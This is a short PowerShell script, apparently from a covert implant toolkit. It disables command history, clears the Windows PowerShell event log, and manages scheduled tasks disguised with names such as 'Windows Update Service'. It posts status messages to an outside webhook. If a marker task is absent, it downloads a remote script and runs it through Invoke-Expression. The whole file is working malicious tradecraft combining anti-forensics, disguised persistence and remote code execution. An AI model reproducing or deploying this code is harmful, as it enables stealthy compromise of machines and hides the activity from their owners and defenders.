$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
$taskset = @("Windows Update Service", "Windows Security Update Service", "Windows Activation Status Verifier")
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$taskschurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"

# Check if the task named "RegBackupVerifier" exists
try {
    Get-ScheduledTask -TaskName "RegBackupVerifier" -ErrorAction Stop
    $tasksExist = $false
    $tasksUnregistered = $true

    # If the task exists, unregister the specified tasks
    foreach ($task in $taskset) {
        try {
            Get-ScheduledTask -TaskName $task -ErrorAction Stop
            Unregister-ScheduledTask -TaskName $task -Confirm:$false -Force | Out-Null
            $tasksExist = $true
        } catch {
            $tasksUnregistered = $false
        }
    }

    # If all tasks unregistered successfully or no tasks existed, clean up
    if ($tasksExist -and $tasksUnregistered) {
        Remove-Item -Path $shellscriptpath -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        $message = "Depreciated Scheduled Tasks Removal Successful."
        Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
        Remove-Item -Path $botpath -Confirm:$false -Force -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    # If the task does not exist, run the task scheduler service creator script
    Invoke-Expression (Invoke-WebRequest -Uri $taskschurl -UseBasicParsing).Content | Out-Null
}
